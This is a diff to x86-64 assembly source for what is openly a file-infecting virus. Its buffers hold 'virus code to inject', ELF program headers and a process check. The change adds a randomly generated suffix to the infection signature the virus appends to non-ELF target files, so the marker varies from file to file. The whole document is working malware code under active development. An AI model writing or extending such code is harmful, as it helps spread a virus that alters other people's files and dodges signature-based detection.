@@ -20,6 +20,7 @@ section .bss
     elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
     sig_check_buf:  resb BUFFER_SIZE          ; buffer for checking signature
     virus_copy_buf: resb 16384                ; buffer for virus code to inject
+    random_suffix:  resb RANDOM_SUFFIX_LEN    ; buffer for random signature suffix
     
     ; Buffers for process check
     proc_dirent_buf: resb 512                 ; buffer for getdents64
@@ -523,6 +524,9 @@ process_non_elf_file:
     mov edi, r13d
     syscall
 
+    ; Generate random suffix before opening file for append
+    call generate_random_suffix
+
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
     mov rsi, r12
@@ -535,10 +539,21 @@ process_non_elf_file:
 
     mov r13, rax
 
+    ; Write base signature
     mov eax, SYS_WRITE
     mov edi, r13d
     lea rsi, [rel signature]
     mov edx, signature_len
+    syscall
+
+    test rax, rax
+    js .process_write_failed
+
+    ; Write random suffix
+    mov eax, SYS_WRITE
+    mov edi, r13d
+    lea rsi, [rel random_suffix]
+    mov edx, RANDOM_SUFFIX_LEN
     syscall
 
     test rax, rax
